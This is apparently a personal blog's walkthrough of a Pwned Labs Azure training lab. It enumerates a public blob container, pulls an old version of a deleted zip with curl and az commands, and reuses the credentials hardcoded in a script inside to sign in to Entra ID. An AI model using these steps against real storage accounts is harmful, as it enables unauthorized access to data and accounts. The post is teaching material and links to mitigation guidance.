---
title: "Azure Blob Container to Initial Access"
date: 2024-09-26T23:32:03+01:00
description: "Discover how Azure Blob Containers can be exploited for initial access in cloud environments and learn best practices to secure them"
categories: [Cloud]
tags: [Azure, Red Teaming, Entra-ID, Powershell]
image: "https://i.pinimg.com/originals/86/41/a4/8641a4adec1d2b10746d02e664f6f9da.gif"
---

**Note : This article was inspired by content from [Pwned Labs](https://pwnedlabs.io/labs/azure-blob-container-to-initial-access). Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.**

## **WalkThrough**


Started a new **Azure** red team lab series on **[@Pwnedlabs](https://pwnedlabs.io/)** and it has been fun so far. Thanks to my very good friend, [Ayush](https://x.com/Hac10101), who introduced me to this platform. 

As the blog header says, we can go ahead and start this lab in which we are given a URL, Navigating to the URL, we can see that this is truly hosted on the Azure cloud service.


![](https://i.imgur.com/yTmThdZ.png)


> Platform as a service (PaaS) is **a complete development and deployment environment in the cloud**, with resources that enable you to deliver everything from simple cloud-based apps to sophisticated, cloud-enabled enterprise applications.


Viewing source code we can see that we have a blob URL, This allows for:

- The storage and management of data, such as documents, images, videos, and backups. 
- The Blob storage service is highly available and can be a cost-effective option.


![](https://i.imgur.com/9dtIqKO.png)


> Azure Blob Storage is Microsoft's cloud service for storing large amounts of unstructured data, such as text or binary files, that don't fit into a specific data model. "Blob" stands for "binary large object."



It is possible to verify if this endpoint is up by making the following requests, Note that you have to replace `/static` with `/index.html` :


```powershell
Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head

StatusCode        : 200
StatusDescription : OK
Content           : 
RawContent        : HTTP/1.1 200 OK
                    ETag: 0x8DBD1A84E6455C0
                    Server: Windows-Azure-Blob/1.0
                    Server: Microsoft-HTTPAPI/2.0
                    x-ms-request-id: 679bb941-301e-0015-523b-105b8c000000
                    x-ms-version: 2009-09-19
                    x-ms-lease-status: u…
Headers           : {[ETag, System.String[]], [Server, System.String[]], [x-ms-request-id, System.String[]], [x-ms-version, System.String[]]…}
Images            : {}
InputFields       : {}
Links             : {}
RawContentLength  : 0
RelationLink      : {}
```


```bash
❯ curl -I https://mbtwebsite.blob.core.windows.net/$web/index.html
HTTP/1.1 400 One of the request inputs is out of range.
Transfer-Encoding: chunked
Server: Blob Service Version 1.0 Microsoft-HTTPAPI/2.0
x-ms-request-id: 87b5de6d-b01e-009d-3243-10be85000000
Date: Thu, 26 Sep 2024 18:41:58 GMT

# Note : It is worth using 'powershell' or 'pwsh' in 'kali'
```


We can go ahead and expand the `Headers` property as this should give us a clear view of this endpoint. You can also do this for the `RawContent` property.


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress> Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head | Select-Object -ExpandProperty Headers

Key               Value
---               -----
ETag              {0x8DBD1A84E6455C0}
Server            {Windows-Azure-Blob/1.0, Microsoft-HTTPAPI/2.0}
x-ms-request-id   {9d1c2618-e01e-00bf-2042-107b9a000000}
x-ms-version      {2009-09-19}
x-ms-lease-status {unlocked}
x-ms-blob-type    {BlockBlob}
Date              {Thu, 26 Sep 2024 18:31:40 GMT}
Content-Length    {782359}
Content-Type      {text/html}
Content-MD5       {JSe+sM+pXGAEFInxDgv4CA==}
Last-Modified     {Fri, 20 Oct 2023 20:08:20 GMT}
```



We can also look into each components of this blob URL at [https://mbtwebsite.blob.core.windows.net/$web/index.html](https://mbtwebsite.blob.core.windows.net/$web/index.html)


```
https: The protocol used. Azure Blob Service supports both http and https


mbtwebsite: The name of the Azure Storage Account associated with the website.


blob.core.windows.net: The Azure Blob Storage Service


$web: The name of the container hosting the website, and it is situated within the storage account. (Fuzzable with ffuf)


index.html: The web page being requested
```


> Note that the container is always bruteforce-able as shown in this [blog](https://shellbr3ak.medium.com/first-time-hacking-the-cloud-205751a4c61) using tools like `ffuf` and `MicroBurst`



We can then go ahead and look for sensitive public information on the container `/$web` with the default blob parameter `?restype=container&comp=list`  by sending a HTTP requests to the Azure Storage REST API.



![](https://i.imgur.com/A8vkDkL.png)



As shown above there is alot of data and this can be terrible to read, we can set a delimiter to read only directories : `?restype=container&comp=list&delimiter=%2F`


![](https://i.imgur.com/eaHIlQ9.png)



We can also automate all this process by using `Azure-CLI` and other methods as specified in both of this blogs ; [Blog1](https://edi.wang/post/2024/8/5/how-to-list-all-files-in-a-public-azure-storage-container), [Blog2](https://blog.ironmansoftware.com/azure-blobs-powershell/).


```bash
❯ az storage blob list --account-name mbtwebsite --container-name '$web' --output table
```


![](https://i.imgur.com/dm0cUiN.jpeg)



However as shown in the above output there isn't any sensitive file found yet, we can go ahead and dig deeper by checking if versioning has been enabled for the container, and if we see any previous versions of files.

 ```
/?restype=container&comp=list&include=versions
```


![](https://i.imgur.com/yeWq1Ix.png)


> "Blob versioning is a useful feature as it allows point-in-time recovery of individual blobs. A file may no longer exist, but a version of the file will still be stored. Sometimes files are temporarily uploaded for transfer, or maybe deleted after they are found to contain sensitive data..."   *-- PwnedLabs* 


However as shown above trying to list previous versions using a browser isn't successful, searching for this error on google i came across a solution from [stackoverflow](https://stackoverflow.com/a/77494363) by using the `Az-CLI` method or `curl` with the `x-ms-version` header.


```
❯ az rest --method get --url 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions' --headers "x-ms-version=2019-10-10" | xmlstarlet fo

curl -H "x-ms-version: 2019-10-10" 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions' | xmlstarlet fo
```

***Using Azure-CLI*** :

![](https://i.imgur.com/aX7HzAM.png)


***Using curl*** :

![](https://i.imgur.com/Wh58T8T.jpeg)

> Reason : The `versions` parameter is only supported by version 2019-12-12 and later so it must be specified in our request.


As we can see we got an extra `scripts-transfer.zip` file using this method, we can go ahead and download this using `curl`. Don't forget to include the `versionId` parameter and the `x-ms-version` header in your request :


```bash
❯ curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionId=2024-03-29T20:55:40.8265593Z' --output scripts-transfer.zip

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1503  100  1503    0     0    111      0  0:00:13  0:00:13 --:--:--   354
```


Then go ahead an unzip the files to a directory :


```bash
❯ mkdir scripts

❯ unzip scripts-transfer.zip -d scripts
Archive:  scripts-transfer.zip
  inflating: scripts/entra_users.ps1  
  inflating: scripts/stale_computer_accounts.ps1  
```



Checking the first powershell script we have credentials for the user `marcus`


```powershell
❯ \cat entra_users.ps1
# Install the required modules if not already installed
# Install-Module -Name Az -Force -Scope CurrentUser
# Install-Module -Name MSAL.PS -Force -Scope CurrentUser

# Import the required modules
Import-Module Az
Import-Module MSAL.PS

# Define your Azure AD credentials
$Username = "marcus@megabigtech.com"
$Password = "[REDACTED]" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)

# Authenticate to Azure AD using the specified credentials
Connect-AzAccount -Credential $Credential

# Define the Microsoft Graph API URL
$GraphApiUrl = "https://graph.microsoft.com/v1.0/users?$select=displayName,userPrincipalName"

# Retrieve the access token for Microsoft Graph
$AccessToken = (Get-AzAccessToken -ResourceType MSGraph).Token

# Create a headers hashtable with the access token
$headers = @{
    "Authorization" = "Bearer $AccessToken"
    "ContentType"   = "application/json"
}

# Retrieve User Information and Last Sign-In Time using Microsoft Graph via PowerShell
$response = Invoke-RestMethod -Uri $GraphApiUrl -Method Get -Headers $headers

# Output the response (formatted as JSON)
$response | ConvertTo-Json
```

Go ahead and type the following command to initiate the authentication process to log into the Azure account we just discovered with your username and password.


```bash
❯ az login
```


![](https://i.imgur.com/4Ay69mu.png)




![](https://i.imgur.com/qtmrUSu.png)


For authentication context we can confirm that we truly have the Azure Account Details of our compromised user :


```bash
❯ az account show
{
  "environmentName": "AzureCloud",
  "homeTenantId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "id": "ceff06cb-e29d-4486-a3ae-eaaec5689f94",
  "isDefault": true,
  "managedByTenants": [],
  "name": "Microsoft Azure Sponsorship",
  "state": "Enabled",
  "tenantDefaultDomain": "megabigtech.com",
  "tenantDisplayName": "Default Directory",
  "tenantId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "user": {
    "name": "marcus@megabigtech.com",
    "type": "user"
  }
}
```



You can then navigate to [https://portal.azure.com/](https://portal.azure.com/), to login to the web-based dashboard that manages all of the Azure resources.



![](https://i.imgur.com/s1ssXTb.png)


Go ahead and open up the Azure cloud shell with the console icon by the top right



![](https://i.imgur.com/2IOvzfV.png)


Once this is done you should have a cloud console like the below 


![](https://i.imgur.com/Iq8Y9X0.png)

Using this [cheatsheet](https://github.com/andreipintica/Azure-PowerShell-CheatSheet?tab=readme-ov-file#connect-to-azure-active-directory) for list of commands i was able to come up with the below command to list the properties of our current user.

```powershell
PS /home/marcus> Connect-AzureAD                                                             
PS /home/marcus> Get-AzureADUser -ObjectId marcus@megabigtech.com | Select-Object -Property *

--SNIP--
ObjectId                       : 41c178d3-c246-4c00-98f0-8113bd631676
ObjectType                     : User
AccountEnabled                 : True
AgeGroup                       : 
AssignedLicenses               : {}
AssignedPlans                  : {}
City                           : 
CompanyName                    : 
ConsentProvidedForMinor        : 
Country                        : 
CreationType                   : 
Department                     : 
DirSyncEnabled                 : 
DisplayName                    : Marcus Hutch
FacsimileTelephoneNumber       : 
GivenName                      : Marcus
IsCompromised                  : 
ImmutableId                    : 
JobTitle                       : Flag: [REDACTED]
LastDirSyncTime                : 
LegalAgeGroupClassification    : 
Mail                           : 
MailNickName                   : marcus
Mobile                         : 
OnPremisesSecurityIdentifier   : 
OtherMails                     : {}
PasswordPolicies               : 
PasswordProfile                : 
PhysicalDeliveryOfficeName     : 
PostalCode                     : 
PreferredLanguage              : 
ProvisionedPlans               : {}
ProvisioningErrors             : {}
ProxyAddresses                 : {}
RefreshTokensValidFromDateTime : 9/26/2024 9:04:50 PM
ShowInAddressList              : 
SignInNames                    : {}
SipProxyAddress                : 
State                          : 
StreetAddress                  : 
Surname                        : Hutch
TelephoneNumber                : 
UsageLocation                  : 
UserPrincipalName              : marcus@megabigtech.com
UserState                      : 
UserStateChangedOn             : 
UserType                       : Member

PS /home/marcus> 
```

That would be all for today ( -_•)︻デ═一


## **References & Mitigations**

- **Lab Link :** [https://pwnedlabs.io/labs/azure-blob-container-to-initial-access](https://pwnedlabs.io/labs/azure-blob-container-to-initial-access)
- [Security recommendations for Blob storage](https://learn.microsoft.com/en-us/azure/storage/blobs/security-recommendations)
- [Securing Azure Blob Storage: Set-Up Guide](https://www.varonis.com/blog/azure-blob-storage)
- [Security best practices for Azure Blob Storage](https://learn.microsoft.com/en-us/shows/inside-azure-for-it/security-best-practices-for-azure-blob-storage)